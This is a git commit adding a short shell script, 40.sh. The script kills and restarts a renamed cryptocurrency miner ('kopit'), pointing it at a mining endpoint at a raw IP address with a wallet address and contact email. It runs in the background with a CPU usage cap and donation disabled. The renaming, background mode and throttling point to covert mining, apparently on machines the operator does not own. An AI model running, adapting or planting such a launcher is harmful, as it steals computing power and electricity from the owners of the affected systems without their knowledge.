7d8ee420f6499d31d62a10572800afec77cd6a9c
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-04-11 20:53:00 +0800

    Add files via upload

---
+++ 40.sh
@@ -0,0 +1,3 @@
+pkill kopit
+sleep 7
+kopit -o 95.216.221.138:8877 -u 48dikUSkGo4iA4jWoBRNy4CqxrUeXPicJRPCJ8w8WWVfjmEDgNWzZdP3V9N5zCn3GRHrxGUiuTzU52M5vsJZGKNwH4SAvcn --pass=12:kotminkot@yandex.ru --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=74 --av=1 --variant -1
